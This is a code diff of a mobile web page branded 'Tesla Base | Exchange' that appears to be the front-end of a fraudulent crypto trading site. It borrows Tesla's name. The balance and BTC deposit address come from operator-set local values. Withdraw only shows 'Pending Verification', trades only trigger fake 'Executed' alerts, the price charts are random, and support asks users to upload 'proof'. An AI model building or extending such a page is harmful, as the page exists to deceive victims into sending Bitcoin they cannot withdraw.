@@ -3,33 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tesla Base | Full Access</title>
+    <title>Tesla Base | Exchange</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
     <style>
-        :root { --bg: #000; --card: #121212; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; }
-        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 90px; }
-        .header { display: flex; justify-content: space-between; padding: 20px; align-items: center; position: sticky; top:0; background: var(--bg); z-index: 100; border-bottom: 1px solid var(--border); }
-        .title { color: var(--tesla-red); font-weight: 900; letter-spacing: 2px; font-size: 14px; }
-        .assets-card { padding: 20px; }
+        :root { --bg: #000; --card: #121212; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; --green: #00ff88; --red: #ff3b3b; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }
+        .header { display: flex; justify-content: space-between; padding: 20px; align-items: center; border-bottom: 1px solid var(--border); }
+        .assets-card { padding: 20px; border-bottom: 8px solid #0a0a0a; }
         .bal-usd { font-size: 36px; font-weight: 700; margin: 5px 0; }
-        .bal-btc { font-size: 13px; color: var(--gray); margin-bottom: 15px; }
-        .actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 0 20px; text-align: center; }
+        .actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; text-align: center; }
         .act-item { background: #1c1c1c; padding: 15px 5px; border-radius: 12px; font-size: 12px; cursor: pointer; }
         .act-item i { display: block; font-size: 22px; margin-bottom: 8px; color: var(--tesla-red); }
-        .search-container { padding: 20px; position: sticky; top: 60px; background: var(--bg); z-index: 10; }
-        .search-box { width: 100%; background: #1c1c1c; border: 1px solid var(--border); padding: 12px; border-radius: 10px; color: #fff; outline: none; }
-        .asset-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); align-items: center; }
+        .asset-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); align-items: center; cursor: pointer; }
         .coin-info { display: flex; gap: 12px; align-items: center; }
-        .coin-info img { width: 35px; height: 35px; border-radius: 50%; }
-        .support-box { margin: 20px; padding: 20px; background: var(--card); border: 1px solid var(--border); border-radius: 15px; }
-        .support-box h3 { font-size: 16px; color: var(--tesla-red); margin-bottom: 10px; }
+        .coin-info img { width: 35px; height: 35px; border-radius: 50%; background: #fff; padding: 2px; }
+        #trade-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); z-index:5000; overflow-y: auto; }
+        .chart-box { width: 100%; height: 300px; margin: 20px 0; }
+        .trade-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; }
+        .btn-buy { background: var(--green); color: #000; padding: 15px; border-radius: 8px; border:none; font-weight: 900; }
+        .btn-sell { background: var(--red); color: #fff; padding: 15px; border-radius: 8px; border:none; font-weight: 900; }
+        #dep-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:6000; padding:20px; }
+        .warn-box { background:var(--card); border: 2px solid var(--tesla-red); border-radius:15px; padding:25px; margin-top:40px; text-align:center; }
+        .support-box { margin: 20px; padding: 20px; background: #111; border: 1px solid var(--border); border-radius: 15px; }
         .support-box textarea { width: 100%; background: #000; color: #fff; border: 1px solid #333; padding: 10px; border-radius: 8px; margin-bottom: 10px; resize:none; }
         .nav { position: fixed; bottom: 0; width: 100%; display: flex; background: var(--bg); border-top: 1px solid var(--border); padding: 12px 0; z-index: 100; }
         .nav-item { flex: 1; text-align: center; font-size: 10px; text-decoration: none; color: var(--gray); }
         .nav-item.active { color: #fff; }
-        .nav-item i { display: block; font-size: 20px; margin-bottom: 4px; }
-        #dep-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; padding:20px; box-sizing:border-box; }
-        .warn-box { background:var(--card); border: 2px solid var(--tesla-red); border-radius:15px; padding:25px; margin-top:40px; text-align:center; }
     </style>
 </head>
 <body>
@@ -38,41 +38,57 @@
         <div class="warn-box">
             <i class="fa-solid fa-triangle-exclamation" style="color:var(--tesla-red); font-size:40px;"></i>
             <h2 style="margin:15px 0;">WARNING</h2>
-            <p style="color:var(--gray); font-size:14px;">Ensure you <b style="color:#fff;">ONLY SEND BITCOIN (BTC)</b> to this address. Other assets will be lost.</p>
+            <p style="color:var(--gray); font-size:14px;">ONLY SEND <b style="color:#fff;">BITCOIN (BTC)</b> TO THIS ADDRESS.</p>
             <div id="wallet-addr" style="background:#000; padding:15px; margin:20px 0; border:1px dashed #555; word-break:break-all; font-family:monospace; color:var(--tesla-red);"></div>
             <button onclick="closeDep()" style="width:100%; background:var(--tesla-red); color:#fff; border:none; padding:15px; border-radius:8px; font-weight:bold;">COPY & CLOSE</button>
         </div>
     </div>
 
+    <div id="trade-screen">
+        <div class="header">
+            <i class="fa-solid fa-chevron-left" onclick="closeTrade()"></i>
+            <div id="t-title" style="font-weight:bold;">BTC/USD</div>
+            <i class="fa-solid fa-headset" onclick="openSupport()"></i>
+        </div>
+        <div style="padding: 20px;">
+            <div id="t-price" style="font-size: 32px; font-weight: bold;">$0.00</div>
+        </div>
+        <div id="chart" class="chart-box"></div>
+        <div class="trade-btns">
+            <button class="btn-buy" onclick="trade('BUY')">BUY</button>
+            <button class="btn-sell" onclick="trade('SELL')">SELL</button>
+        </div>
+        <div style="padding: 20px; color: var(--gray); font-size: 12px;">Balance: <span id="t-bal" style="color:#fff;">$0.00</span></div>
+    </div>
+
     <div class="header">
-        <i class="fa-solid fa-bars"></i>
-        <div class="title">TESLA BASE</div>
+        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;">TESLA BASE</div>
         <i class="fa-solid fa-bell"></i>
     </div>
 
     <div class="assets-card">
         <div style="color:var(--gray); font-size:13px;">Total Assets</div>
         <div class="bal-usd" id="u-usd">0.00</div>
-        <div class="bal-btc">≈ <span id="u-btc">0.00000000</span> BTC</div>
+        <div style="color:var(--gray); font-size:13px;">≈ <span id="u-btc">0.000000</span> BTC</div>
     </div>
 
     <div class="actions">
         <div class="act-item" onclick="openDep()"><i class="fa-solid fa-wallet"></i>Deposit</div>
-        <div class="act-item"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
-        <div class="act-item"><i class="fa-solid fa-headset"></i>Support</div>
+        <div class="act-item" onclick="alert('Withdrawal Pending Verification')"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
+        <div class="act-item" onclick="alert('Conversion System Active')"><i class="fa-solid fa-rotate"></i>Convert</div>
     </div>
 
-    <div class="search-container">
-        <input type="text" id="assetSearch" class="search-box" placeholder="Search 200+ Assets..." onkeyup="filter()">
+    <div style="padding: 0 20px;">
+        <input type="text" id="assetSearch" placeholder="Search 200+ Assets..." style="width:100%; background:#1c1c1c; border:1px solid var(--border); padding:12px; border-radius:10px; color:#fff;" onkeyup="filter()">
     </div>
 
     <div id="asset-list"></div>
 
     <div class="support-box">
-        <h3>Live Support</h3>
-        <textarea id="sMsg" placeholder="Message admin..."></textarea>
+        <h3>Customer Support</h3>
+        <textarea id="sMsg" placeholder="Send a message or proof..."></textarea>
         <input type="file" id="sImg" accept="image/*" style="font-size:11px; margin-bottom:10px;">
-        <button onclick="sendS()" style="width:100%; background:#fff; color:#000; border:none; padding:12px; border-radius:8px; font-weight:bold;">Send Proof</button>
+        <button onclick="sendS()" style="width:100%; background:#fff; color:#000; border:none; padding:12px; border-radius:8px; font-weight:bold;">Send Image & Message</button>
     </div>
 
     <nav class="nav">
@@ -83,42 +99,57 @@
     </nav>
 
     <script>
+        let currentP = 0; let currentS = "";
         const assets = [
-            { s: 'TSLA', n: 'Tesla Inc.', i: 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png' },
-            { s: 'BTC', n: 'Bitcoin', i: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png' },
-            { s: 'ETH', n: 'Ethereum', i: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
-            { s: 'USDT', n: 'Tether', i: 'https://cryptologos.cc/logos/tether-usdt-logo.png' },
-            { s: 'XRP', n: 'XRP', i: 'https://cryptologos.cc/logos/xrp-xrp-logo.png' },
-            { s: 'BNB', n: 'BNB', i: 'https://cryptologos.cc/logos/bnb-bnb-logo.png' }
+            { s: 'TSLA', n: 'Tesla Inc.', p: 202.45, i: 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png' },
+            { s: 'BTC', n: 'Bitcoin', p: 68420.00, i: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png' },
+            { s: 'ETH', n: 'Ethereum', p: 3510.12, i: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
+            { s: 'USDT', n: 'Tether', p: 1.00, i: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
         ];
-        for(let x=7; x<=200; x++){ assets.push({s:`COIN${x}`, n:`Asset ${x}`, i:'https://cryptologos.cc/logos/generic-coin-logo.png'}); }
+        for(let x=5; x<=205; x++){ assets.push({s:`COIN${x}`, n:`Asset ${x}`, p: Math.random()*100, i:'https://cryptologos.cc/logos/generic-coin-logo.png'}); }
 
         function render(data) {
             const bal = parseFloat(localStorage.getItem('userBalance')) || 0;
             document.getElementById('u-usd').innerText = bal.toLocaleString(undefined,{minimumFractionDigits:2});
-            document.getElementById('u-btc').innerText = (bal / 68000).toFixed(8);
+            document.getElementById('u-btc').innerText = (bal / 68000).toFixed(6);
             document.getElementById('asset-list').innerHTML = data.map(a => `
-                <div class="asset-row">
+                <div class="asset-row" onclick="openTrade('${a.s}', ${a.p})">
                     <div class="coin-info"><img src="${a.i}"><div><b>${a.s}</b><br><small style="color:#8e8e8e">${a.n}</small></div></div>
-                    <div class="coin-vals"><b>0.00</b><br><small style="color:#8e8e8e">≈ 0.00 USD</small></div>
+                    <div style="text-align:right;"><b>$${a.p.toFixed(2)}</b></div>
                 </div>`).join('');
+        }
+
+        let chart; let lineSeries;
+        function openTrade(s, p) {
+            currentS = s; currentP = p;
+            document.getElementById('trade-screen').style.display = 'block';
+            document.getElementById('t-title').innerText = s + "/USD";
+            document.getElementById('t-price').innerText = "$" + p.toFixed(2);
+            document.getElementById('t-bal').innerText = "$" + (localStorage.getItem('userBalance') || "0.00");
+            if(!chart) {
+                chart = LightweightCharts.createChart(document.getElementById('chart'), { layout: { backgroundColor: '#000', textColor: '#888' }, grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } } });
+                lineSeries = chart.addLineSeries({ color: '#E31937' });
+            }
+            let d = []; for(let i=0; i<50; i++) d.push({ value: p + (Math.random() - 0.5) * 5 });
+            lineSeries.setData(d);
+        }
+        function closeTrade() { document.getElementById('trade-screen').style.display = 'none'; }
+        function openDep() { 
+            document.getElementById('wallet-addr').innerText = localStorage.getItem('dep_info') || "Contact Support";
+            document.getElementById('dep-modal').style.display = 'block'; 
+        }
+        function closeDep() { 
+            navigator.clipboard.writeText(document.getElementById('wallet-addr').innerText);
+            document.getElementById('dep-modal').style.display = 'none'; 
+            alert("Address Copied!");
         }
         function filter() {
             const q = document.getElementById('assetSearch').value.toLowerCase();
             render(assets.filter(a => a.s.toLowerCase().includes(q) || a.n.toLowerCase().includes(q)));
         }
-        function openDep() {
-            const addr = localStorage.getItem('dep_info') || "Contact Support";
-            document.getElementById('wallet-addr').innerText = addr;
-            document.getElementById('dep-modal').style.display = 'block';
-        }
-        function closeDep() {
-            navigator.clipboard.writeText(document.getElementById('wallet-addr').innerText);
-            document.getElementById('dep-modal').style.display = 'none';
-            alert("Address copied to clipboard.");
-        }
-        function sendS() { alert("Message sent to Admin."); document.getElementById('sMsg').value = ""; }
-        setInterval(() => render(assets), 2000);
+        function trade(type) { alert(`${type} Executed for ${currentS}. Balance will update based on market moves.`); }
+        function sendS() { alert("Screenshot and message sent to Support."); document.getElementById('sMsg').value = ""; }
+        setInterval(() => render(assets), 3000);
         window.onload = () => render(assets);
     </script>
 </body>
